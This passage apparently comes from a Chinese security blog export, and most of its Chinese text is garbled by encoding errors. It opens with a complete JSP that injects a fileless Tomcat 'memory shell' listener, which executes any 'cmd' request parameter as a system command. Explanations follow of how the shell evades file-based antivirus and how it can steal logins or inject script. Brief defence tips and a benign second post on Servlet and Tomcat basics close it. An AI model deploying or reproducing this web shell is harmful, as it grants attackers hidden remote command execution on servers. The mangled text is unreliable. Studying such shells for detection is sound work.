class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletServletRequestListenerRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">â€‹        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequestEvent.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">â€‹        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">â€‹            <span class="keyword">try</span> &#123;</span><br><span class="line">â€‹                Runtime.getRuntime().exec(cmd);</span><br><span class="line">â€‹            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">â€‹        &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>æ¯”å–»</strong>ï¼šé“¶è¡Œçš„ <strong>ã€Œå®æ—¶è´¦ç›®ç›‘æ§ç³»ç»Ÿã€</strong>ï¼ˆListenerï¼‰è¢«é»‘å®¢æ›¿æ¢æˆå§åº•ä¼šè®¡ï¼Œæ¯å½“æœ‰èµ„é‡‘æµåŠ¨ï¼ˆäº‹ä»¶è§¦å‘ï¼‰æ—¶ï¼Œå§åº•å°±ä¼šå·å·å¤åˆ¶è´¦æœ¬ï¼ˆçªƒå–æ•°æ®ï¼‰æˆ–ç¯¡æ”¹äº¤æ˜“ï¼ˆæ‰§è¡Œæ¶æ„ä»£ç ï¼‰ã€‚  </p><p><strong>æ ¸å¿ƒç‰¹ç‚¹</strong>ï¼š<br>â€¢ <strong>æ— æ–‡ä»¶</strong>ï¼šå§åº•ä¼šè®¡æ²¡æœ‰åŠ³åŠ¨åˆåŒï¼ˆæ— .classæ–‡ä»¶ï¼‰<br>â€¢ <strong>å¯„ç”Ÿåœ¨å†…å­˜</strong>ï¼šç›´æ¥ç¯¡æ”¹é“¶è¡Œçš„ç›‘æ§ç³»ç»Ÿé…ç½®ï¼ˆStandardContextï¼‰<br>â€¢ <strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šåªåœ¨ç‰¹å®šä¸šåŠ¡å‘ç”Ÿæ—¶è§¦å‘ï¼ˆå¦‚æ–°å®¢æˆ·å¼€æˆ·ã€å¤§é¢è½¬è´¦ï¼‰  </p><hr><h3 id="äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰"><a href="#äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰" class="headerlink" title="äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰"></a><strong>äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰</strong></h3><h4 id="1-æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰"><a href="#1-æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰" class="headerlink" title="1. æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰"></a><strong>1. æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡åå°„è·å–Tomcatçš„&quot;è´¦ç›®ç®¡ç†ä¸­å¿ƒ&quot;  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextField.get(request);  </span><br></pre></td></tr></table></figure><p><em>ç›¸å½“äºé»‘å®¢ä¹°é€šé“¶è¡Œå†…éƒ¨äººå‘˜ï¼Œæ‹¿åˆ°ç›‘æ§ç³»ç»Ÿçš„ç®¡ç†æƒé™</em>  </p><h4 id="2-åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰"><a href="#2-åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰" class="headerlink" title="2. åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰"></a><strong>2. åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        <span class="comment">// å½“æœ‰å®¢æˆ·æ¥åŠä¸šåŠ¡ï¼ˆæ”¶åˆ°HTTPè¯·æ±‚ï¼‰æ—¶  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="comment">// å·å·æ‰§è¡Œé»‘å®¢æŒ‡ä»¤ï¼ˆå¦‚æŸ¥è´¦æˆ·ä½™é¢â†’å®é™…æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰  </span></span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><em>å§åº•ä¼šè®¡è¡¨é¢åœ¨åšæ­£å¸¸è´¦ç›®ç™»è®°ï¼Œå®é™…åœ¨è®°å½•æ•æ„Ÿä¿¡æ¯</em>  </p><h4 id="3-ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰"><a href="#3-ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰" class="headerlink" title="3. ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰"></a><strong>3. ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºå§åº•ä¼šè®¡çš„å·¥ç‰Œ  </span></span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå·¥ç‰Œå¡è¿›é“¶è¡Œçš„äººäº‹ç³»ç»Ÿ  </span></span><br><span class="line">standardContext.addApplicationEventListener(evilListener);  </span><br></pre></td></tr></table></figure><p><em>ç°åœ¨é“¶è¡Œçš„ç›‘æ§ç³»ç»Ÿè®¤ä¸ºè¿™æ˜¯åˆæ³•å‘˜å·¥ï¼Œä¼šå‘å…¶æ¨é€æ‰€æœ‰è´¦ç›®å˜åŠ¨</em>  </p><hr><h3 id="ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ"><a href="#ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ" class="headerlink" title="ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ"></a><strong>ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æŠ€æœ¯æ‰‹æ®µ</strong></th><th><strong>ç°å®æ¯”å–»</strong></th><th><strong>ç»•è¿‡å®‰æ£€çš„å…³é”®</strong></th></tr></thead><tbody><tr><td><strong>å¯„ç”Ÿåœ¨StandardContext</strong></td><td>å§åº•ä¼šè®¡çš„ä¿¡æ¯ç›´æ¥å†™å…¥é“¶è¡Œæ ¸å¿ƒç³»ç»Ÿ</td><td>ä¼ ç»Ÿæ£€æŸ¥åªæŸ¥çº¸è´¨æ¡£æ¡ˆï¼Œå‘ç°ä¸äº†å†…å­˜ä¸­çš„é…ç½®</td></tr><tr><td><strong>æ— classæ–‡ä»¶è½åœ°</strong></td><td>æ²¡æœ‰åŠ³åŠ¨åˆåŒï¼Œåªæœ‰å£å¤´å…¥èŒ</td><td>æ€æ¯’è½¯ä»¶æ‰«ææ–‡ä»¶æ—¶ä¸€æ— æ‰€è·</td></tr><tr><td><strong>åˆ©ç”¨åˆæ³•äº‹ä»¶è§¦å‘</strong></td><td>åªåœ¨åŠä¸šåŠ¡æ—¶åŠ¨æ‰‹ï¼Œå¹³æ—¶ä¼ªè£…æ­£å¸¸</td><td>ç®¡ç†å‘˜å¾ˆéš¾åŒºåˆ†æ­£å¸¸è´¦ç›®æ“ä½œå’Œæ¶æ„è¡Œä¸º</td></tr></tbody></table><hr><h3 id="å››ã€å¸¸è§æ”»å‡»åœºæ™¯"><a href="#å››ã€å¸¸è§æ”»å‡»åœºæ™¯" class="headerlink" title="å››ã€å¸¸è§æ”»å‡»åœºæ™¯"></a><strong>å››ã€å¸¸è§æ”»å‡»åœºæ™¯</strong></h3><ol><li><p><strong>çªƒå–ç™»å½•å‡­è¯</strong><br>å½“ç”¨æˆ·å‘èµ·ç™»å½•è¯·æ±‚æ—¶ï¼ˆè§¦å‘ <code>ServletRequest</code> äº‹ä»¶ï¼‰ï¼Œå§åº•ä¼šè®¡è®°å½•è´¦å·å¯†ç ã€‚  </p></li><li><p><strong>å†…ç½‘æ¸—é€</strong><br>ç›‘å¬æ¯æ¬¡è¯·æ±‚ï¼Œæ£€æµ‹åˆ°ç‰¹å®šå‚æ•°ï¼ˆå¦‚ <code>?cmd=whoami</code>ï¼‰æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚  </p></li><li><p><strong>æ•°æ®ç¯¡æ”¹</strong><br>åœ¨å“åº”è¿”å›å‰ï¼ˆè§¦å‘ <code>ServletResponse</code> äº‹ä»¶ï¼‰ï¼Œä¿®æ”¹é¡µé¢å†…å®¹æ’å…¥æ¶æ„JSã€‚</p></li></ol><hr><h3 id="äº”ã€é˜²å¾¡å£è¯€"><a href="#äº”ã€é˜²å¾¡å£è¯€" class="headerlink" title="äº”ã€é˜²å¾¡å£è¯€"></a><strong>äº”ã€é˜²å¾¡å£è¯€</strong></h3><blockquote><p>ğŸ” <strong>ç›‘æ§Listeneråˆ—è¡¨</strong>ï¼šå®šæœŸæ£€æŸ¥é“¶è¡Œäººäº‹ç³»ç»Ÿï¼ˆStandardContextï¼‰æ˜¯å¦æœ‰é™Œç”Ÿä¼šè®¡<br>ğŸ›¡ï¸ <strong>ç¦ç”¨é«˜å±API</strong>ï¼šç¦æ­¢ä¼šè®¡ä½¿ç”¨å¤å°æœºï¼ˆç¦æ­¢JNIè°ƒç”¨ã€åå°„ç­‰ï¼‰<br>ğŸ“œ <strong>æœ€å°åŒ–æƒé™</strong>ï¼šä¼šè®¡åªèƒ½æŸ¥çœ‹è‡ªå·±è´Ÿè´£çš„è´¦ç›®ï¼ˆæ²™ç®±ç¯å¢ƒè¿è¡ŒTomcatï¼‰  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå†…å­˜é©¬åŸºç¡€</title>
      <link href="/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-Web-ä¸‰å¤§ä»¶"><a href="#Java-Web-ä¸‰å¤§ä»¶" class="headerlink" title="Java Web ä¸‰å¤§ä»¶"></a>Java Web ä¸‰å¤§ä»¶</h2><p>Java Web ä¸‰å¤§ä»¶ï¼Œä¹Ÿå°±æ˜¯ Servletï¼ŒFilterï¼ŒListener</p><p>å½“ Tomcat æ¥æ”¶åˆ°è¯·æ±‚æ—¶å€™ï¼Œä¾æ¬¡ä¼šç»è¿‡ Listener -&gt; Filter -&gt; Servlet</p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><ul><li><a href="https://www.cnblogs.com/fwnboke/p/9119244.html">https://www.cnblogs.com/fwnboke/p/9119244.html</a></li></ul><p>è¿™é‡Œç®€å•æ€»ç»“ä¸‹</p><p>æˆ‘å°½é‡ç”¨å¤§ç™½è¯è§£é‡Šä¸€ä¸‹è¿™ä¸ªé“¾æ¥é‡Œçš„å†…å®¹ï¼š</p><ol><li><strong>Servletæ˜¯ä»€ä¹ˆ</strong>ï¼š</li></ol><ul><li>ä½ å¯ä»¥æŠŠServletç†è§£æˆâ€æœåŠ¡å‘˜â€ï¼Œä¸“é—¨å¤„ç†ç½‘ç«™çš„å„ç§è¯·æ±‚ã€‚æ¯”å¦‚ä½ ç‚¹å¤–å–ï¼ˆå‘é€è¯·æ±‚ï¼‰ï¼ŒæœåŠ¡å‘˜ï¼ˆServletï¼‰æ¥å•åå»å¨æˆ¿ï¼ˆæœåŠ¡å™¨ï¼‰åšå¥½ï¼Œå†æ‰“åŒ…ï¼ˆç”Ÿæˆç½‘é¡µï¼‰é€ç»™ä½ ã€‚</li></ul><ol><li><strong>Servletçš„å·¥ä½œåœºæ™¯</strong>ï¼š</li></ol><ul><li>åŠ¨æ€ç”Ÿæˆç½‘é¡µï¼ˆæ¯”å¦‚æ·˜å®çš„å•†å“é¡µé¢ï¼Œæ¯ä¸ªäººçœ‹åˆ°çš„éƒ½ä¸ä¸€æ ·ï¼‰</li><li>æŠŠè¯·æ±‚è½¬äº¤ç»™å…¶ä»–â€æœåŠ¡å‘˜â€å¤„ç†ï¼ˆåƒé¤å…é‡ŒæœåŠ¡å‘˜ä¹‹é—´äº¤æ¥å·¥ä½œï¼‰</li><li>è¿æ¥æ•°æ®åº“ï¼ˆæ¯”å¦‚æŸ¥ä½ çš„å¿«é€’ä¿¡æ¯ï¼‰</li><li>è¯»å–å®¢æˆ·çš„å°çº¸æ¡ï¼ˆCookieï¼‰</li></ul><ol><li><strong>å››ä¸ªé‡è¦å·¥å…·</strong>ï¼š</li></ol><ul><li><strong>è¯·æ±‚å•å­ï¼ˆHttpServletRequestï¼‰</strong>ï¼šè®°å½•å®¢æˆ·çš„æ‰€æœ‰è¦æ±‚ï¼ˆæ¯”å¦‚æœç´¢å…³é”®è¯ï¼‰</li><li><strong>å›å¤ç›’å­ï¼ˆHttpServletResponseï¼‰</strong>ï¼šç”¨æ¥æ‰“åŒ…è¦è¿”å›ç»™å®¢æˆ·çš„ä¸œè¥¿</li><li><strong>ä¸ªäººå·¥ä½œç‰Œï¼ˆServletConfigï¼‰</strong>ï¼šæ¯ä¸ªæœåŠ¡å‘˜ç‹¬æœ‰çš„é…ç½®ï¼ˆæ¯”å¦‚ä¸“å±çš„è°ƒæ–™é…æ–¹ï¼‰</li><li><strong>é¤å…å…¬å‘Šæ¿ï¼ˆServletContextï¼‰</strong>ï¼šæ‰€æœ‰æœåŠ¡å‘˜å…±äº«çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚ä»Šæ—¥ç‰¹ä»·èœï¼‰</li></ul><ol><li><strong>æœåŠ¡å‘˜çš„å·¥ä½œæµç¨‹</strong>ï¼š</li></ol><ul><li>ä¸Šç­ç­¾åˆ°ï¼ˆinit()ï¼‰ï¼šç¬¬ä¸€æ¬¡è¢«å«æ—¶åšå‡†å¤‡</li><li>å¤„ç†è®¢å•ï¼ˆservice()ï¼‰ï¼šæ ¹æ®å®¢æˆ·è¦æ±‚ï¼ˆGET&#x2F;POSTï¼‰é€‰æ‹©å¤„ç†æ–¹æ³•</li><li>ä¸‹ç­æ”¶å·¥ï¼ˆdestroy()ï¼‰ï¼šå…³ç¯å…³ç…¤æ°”ï¼Œæ”¶æ‹¾ä¸œè¥¿</li></ul><ol><li><strong>ä¸¤ç§ä¸Šç­æ–¹å¼</strong>ï¼š</li></ol><ul><li>æœ‰å®¢äººå«æ‰èµ·åºŠï¼ˆé»˜è®¤ï¼‰</li><li>æå‰åˆ°å²—å¾…å‘½ï¼ˆé…ç½®load-on-startupï¼Œæ•°å­—è¶Šå°è¶Šæ—©ä¸Šç­ï¼‰</li></ul><ol><li><strong>é…ç½®å°çªé—¨</strong>ï¼š</li></ol><ul><li>æ•´ä¸ªé¤å…çš„é…ç½®ç”¨ï¼ˆæ¯”å¦‚ç»Ÿä¸€æ‰“8æŠ˜ï¼‰</li><li>ä¸ªäººé…ç½®ç”¨ï¼ˆæ¯”å¦‚æŸæœåŠ¡å‘˜ä¸“å±çš„å›´è£™é¢œè‰²ï¼‰</li><li>ç°åœ¨æµè¡Œç”¨@WebInitParamè¿™ç§è´´æ ‡ç­¾çš„æ–¹å¼é…ç½®ï¼ˆç±»ä¼¼ä¾¿åˆ©è´´ï¼‰</li></ul><ol><li><strong>å¸¸ç”¨å°åŠŸèƒ½</strong>ï¼š</li></ol><ul><li>è·å–å®¢æˆ·è¦æ±‚ï¼šrequest.getParameter()ï¼ˆæ¯”å¦‚æŸ¥å¿«é€’å•å·ï¼‰</li><li>è®¾ç½®è¿”å›æ ¼å¼ï¼šresponse.setContentType()ï¼ˆå‘Šè¯‰æµè§ˆå™¨è¿”å›çš„æ˜¯ç½‘é¡µè¿˜æ˜¯å›¾ç‰‡ï¼‰</li><li>å­˜å–ä¸´æ—¶æ•°æ®ï¼šrequest.setAttribute()ï¼ˆåƒæœåŠ¡å‘˜ä¹‹é—´ä¼ é€’å°çº¸æ¡ï¼‰</li></ul><p>ç®€å•æ¥è¯´ï¼ŒServletå°±æ˜¯ç½‘ç«™åå°çš„â€æœåŠ¡å‘˜å›¢é˜Ÿâ€ï¼Œè´Ÿè´£æ¥æ”¶ç”¨æˆ·è¯·æ±‚ã€å¤„ç†æ•°æ®ã€ç”Ÿæˆç½‘é¡µï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™ç”¨æˆ·æµè§ˆå™¨çš„æ•´ä¸ªè¿‡ç¨‹ã€‚è¿™äº›æœåŠ¡å‘˜ä»¬å„å¸å…¶èŒï¼Œæœ‰çš„ä¸“é—¨å¤„ç†ç™»å½•ï¼Œæœ‰çš„ä¸“é—¨å¤„ç†æ”¯ä»˜ï¼Œå…±åŒç»´æŒç½‘ç«™çš„æ­£å¸¸è¿ä½œã€‚</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p><a href="https://blog.csdn.net/qq_53287512/article/details/129278148">https://blog.csdn.net/qq_53287512/article/details/129278148</a></p><p><strong>Tomcat å°±åƒæ˜¯ä¸€ä¸ªâ€œJavaç½‘ç«™æœåŠ¡å‘˜â€</strong><br>ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆé¤å…é‡Œä¸“é—¨è´Ÿè´£æ¥å¾…é¡¾å®¢çš„æœåŠ¡å‘˜ã€‚å½“ä½ ç”¨ Java å†™äº†ä¸€ä¸ªç½‘ç«™ï¼ˆæ¯”å¦‚ä¸€ä¸ªè´­ç‰©ç½‘ç«™ï¼‰ï¼ŒTomcat çš„ä½œç”¨å°±æ˜¯ï¼š</p><ol><li><strong>æ¥ç”µè¯</strong>ï¼š<br>å½“ç”¨æˆ·ç”¨æµè§ˆå™¨è®¿é—®ä½ çš„ç½‘ç«™ï¼ˆæ¯”å¦‚è¾“å…¥ç½‘å€ï¼‰ï¼ŒTomcat ä¼šç¬¬ä¸€æ—¶é—´â€œæ¥ç”µè¯â€ï¼Œå¬æ‡‚ç”¨æˆ·æƒ³è¦ä»€ä¹ˆï¼ˆæ¯”å¦‚æ‰“å¼€é¦–é¡µã€æäº¤è®¢å•ï¼‰ã€‚</li><li><strong>å–Šå¨å¸ˆå¹²æ´»</strong>ï¼š<br>Tomcat è‡ªå·±ä¸ä¼šå¤„ç†å¤æ‚çš„ä¸šåŠ¡ï¼ˆæ¯”å¦‚è®¡ç®—ä»·æ ¼ã€æŸ¥æ•°æ®åº“ï¼‰ï¼Œä½†å®ƒä¼šå–Šä½ å†™çš„ Java ä»£ç ï¼ˆæ¯”å¦‚ Servletï¼‰æ¥å¹²æ´»ï¼Œå°±åƒæœåŠ¡å‘˜æŠŠè®¢å•ä¼ ç»™åå¨ã€‚</li><li><strong>ä¸Šèœ</strong>ï¼š<br>ç­‰ Java ä»£ç å¤„ç†å®Œæ•°æ®ï¼ŒTomcat ä¼šæŠŠç»“æœï¼ˆæ¯”å¦‚ç”Ÿæˆçš„ç½‘é¡µã€æ•°æ®ï¼‰æ‰“åŒ…å¥½ï¼Œâ€œç«¯â€å›ç»™ç”¨æˆ·çš„æµè§ˆå™¨ã€‚</li></ol><p><strong>ä¸ºä»€ä¹ˆéœ€è¦ Tomcatï¼Ÿ</strong></p><ul><li>æ²¡æœ‰å®ƒï¼Œä½ çš„ Java ä»£ç å°±åƒä¸ä¼šæ¥å®¢çš„å¨å¸ˆï¼Œç©ºæœ‰åŠŸèƒ½ä½†æ²¡äººèƒ½ç”¨ã€‚</li><li>å®ƒå¸®ä½ å¤„ç†äº†ç½‘ç»œé€šä¿¡ã€å¤šçº¿ç¨‹ç­‰å¤æ‚é—®é¢˜ï¼Œä½ åªéœ€è¦ä¸“æ³¨å†™ä¸šåŠ¡é€»è¾‘ã€‚</li></ul><p><strong>æ—¥å¸¸æ¯”å–»</strong></p><ul><li><p>å®‰è£… Tomcat â‰ˆ é›‡ä¸€ä¸ªæœåŠ¡å‘˜</p></li><li><p>éƒ¨ç½²ç½‘ç«™ â‰ˆ æŠŠèœè°±äº¤ç»™æœåŠ¡å‘˜</p></li><li><p>å¯åŠ¨ Tomcat â‰ˆ è®©æœåŠ¡å‘˜å¼€å§‹ä¸Šç­æ¥å®¢</p></li><li><p>ç«¯å£å†²çª â‰ˆ æœåŠ¡å‘˜æŠ¢äº†åˆ«äººçš„å¯¹è®²æœºé¢‘é“ï¼ˆæ¯”å¦‚é»˜è®¤ç”¨ 8080 ç«¯å£ï¼‰</p><h2 id="Tomcat-ä¸­çš„ä¸‰ä¸ª-Context-çš„ç†è§£"><a href="#Tomcat-ä¸­çš„ä¸‰ä¸ª-Context-çš„ç†è§£" class="headerlink" title="Tomcat ä¸­çš„ä¸‰ä¸ª Context çš„ç†è§£"></a>Tomcat ä¸­çš„ä¸‰ä¸ª Context çš„ç†è§£</h2><ul><li><p>Contextï¼šä»£è¡¨ä¸€ä¸ªwebåº”ç”¨ï¼Œä¸€ä¸ªåº”ç”¨å¯ä»¥æœ‰å¤šä¸ªContextï¼Œ<strong>Context å°±æ˜¯ä»£ç çš„â€œå‰§ç»„åœºè®°â€</strong> â€”â€” å®ƒè®°ä½æ‰€æœ‰ç¯å¢ƒç»†èŠ‚ï¼Œè®©æ¯ä¸ªç»„ä»¶ï¼ˆServlet&#x2F;Filterï¼‰ä¸ç”¨è‡ªå·±å¸¦å‰§æœ¬ï¼Œèµ°åˆ°å“ªéƒ½èƒ½ç«‹åˆ»å…¥æˆï¼</p><p><strong>Context å°±æ˜¯ã€Œå½“å‰ç¯å¢ƒçš„æ‰€æœ‰ä¿¡æ¯ã€</strong>ï¼Œç›¸å½“äºæ‹ç”µå½±æ—¶å¯¼æ¼”å–Šå¡åï¼Œå¯¹æ¼”å‘˜è¯´ï¼š<strong>â€œä½ åˆšåˆšæ˜¯åœ¨è¢«è¿½æ€æ—¶å–Šâ€˜å¥¥åˆ©ç»™â€™ï¼Œä¸æ˜¯åƒé¥­æ—¶å–Šçš„ï¼â€</strong> â€”â€” è¿™ä¸ªâ€œè¢«è¿½æ€â€çš„èƒŒæ™¯å°±æ˜¯ Contextã€‚</p><h3 id="Java-ä¸­çš„-ServletContext-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Java-ä¸­çš„-ServletContext-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Java ä¸­çš„ ServletContext æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>Java ä¸­çš„ ServletContext æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>ServletContext å°±æ˜¯æ•´ä¸ª Web åº”ç”¨çš„â€œå‰§ç»„æ¡£æ¡ˆåº“â€</strong>ï¼Œå®ƒä¿å­˜ç€è¿™ä¸ª Web åº”ç”¨çš„æ‰€æœ‰â€œæ‹æ‘„ä¿¡æ¯â€(å¤§æ¦‚å°±æ˜¯è§„å®šäº†å¦‚æœè¦å®ç°ä¸€ä¸ªWEBå®¹å™¨ï¼Œä»–çš„Contexté‡Œé¢è¦æœ‰è¿™äº›ä¸œè¥¿ï¼šè·å–è·¯å¾„ï¼Œè·å–å‚æ•°ï¼Œè·å–å½“å‰çš„filterï¼Œè·å–å½“å‰çš„servletç­‰)ï¼š</p><p><strong>å…¨å±€é“å…·æ¸…å•</strong>ï¼ˆå…¨å±€å‚æ•°ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­˜ï¼šsetAttribute(&quot;é“å…·å&quot;, é“å…·)</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;database_url&quot;</span>, <span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å–ï¼šgetAttribute(&quot;é“å…·å&quot;)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> (String) context.getAttribute(<span 